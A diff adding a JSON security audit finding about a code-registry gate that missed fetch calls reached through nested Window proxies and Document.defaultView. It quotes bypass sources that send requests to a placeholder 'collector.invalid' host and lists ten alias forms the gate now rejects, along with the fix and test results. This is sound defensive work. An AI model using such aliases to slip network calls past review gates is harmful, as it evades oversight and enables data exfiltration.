@@ -1,0 +1,52 @@
+{
+  "schemaVersion": 1,
+  "finding": "SEC-37-114",
+  "auditId": "AUD-276",
+  "severity": "medium",
+  "title": "Registry gate accepted fetch aliases through nested Window and Document.defaultView proxies",
+  "source": "const request = window.window.fetch; request(\"https://collector.invalid/data\");",
+  "sourceExecution": "none; TypeScript AST analysis only",
+  "redReproductions": [
+    {
+      "source": "const request = window.window.fetch; request(\"https://collector.invalid/data\");",
+      "observed": "Gate passed before the Window-proxy fix."
+    },
+    {
+      "source": "const request = window.frames.fetch; request(\"https://collector.invalid/data\");",
+      "observed": "Gate still passed after the first fix; frames was not yet resolved as a Window proxy."
+    },
+    {
+      "source": "const request = document.defaultView.fetch; request(\"https://collector.invalid/data\");",
+      "observed": "Gate still passed after Window-proxy aliases were added; Document.defaultView was not yet resolved as a Window."
+    }
+  ],
+  "sourcesNowRejected": [
+    "window.window.fetch",
+    "globalThis.window.fetch",
+    "window.parent.window.fetch",
+    "window.frames.fetch",
+    "globalThis.frames.fetch",
+    "window.opener.fetch",
+    "globalThis.opener.fetch",
+    "document.defaultView.fetch",
+    "globalThis.document.defaultView.fetch",
+    "window.document.defaultView.fetch"
+  ],
+  "command": "pnpm exec vitest run packages/registry-gate/src/__tests__/window-proxy-network-alias.test.ts",
+  "remediation": "Resolve nested Window proxy members (window, frames, opener, parent, self, top) and Document.defaultView before applying existing network-sink detection, including statically aliased forms.",
+  "validation": {
+    "focusedRegression": "2 tests passed; 10 Window/Document proxy access forms rejected by the checker and the representative source rejected by the complete contribution gate.",
+    "registryGatePackage": "76 tests passed.",
+    "fullUnitSuite": "1206 tests passed in 77 files.",
+    "typecheck": "22 workspace packages passed.",
+    "changedFileLint": "passed.",
+    "resourceIsolation": "324/324 canonical resources passed; 0 symlinks skipped; 0 failures.",
+    "auditAll": "passed all 16 behavioral gates, catalogue build, 718-page Astro production build, Sites Worker build, bundle budgets, provenance, secret/security, and dependency audits."
+  },
+  "browserSemanticsProbe": {
+    "result": "window === window.frames; window.fetch and document.defaultView.fetch are functions; Window.prototype.fetch is undefined in the tested Chromium context.",
+    "scope": "Trusted browser property inspection only; no untrusted resource source was executed and no network request was sent."
+  },
+  "deployment": "not deployed; release-candidate verification remains open",
+  "capturedAtUtc": "2026-10-22T13:49:55.3169193Z"
+}
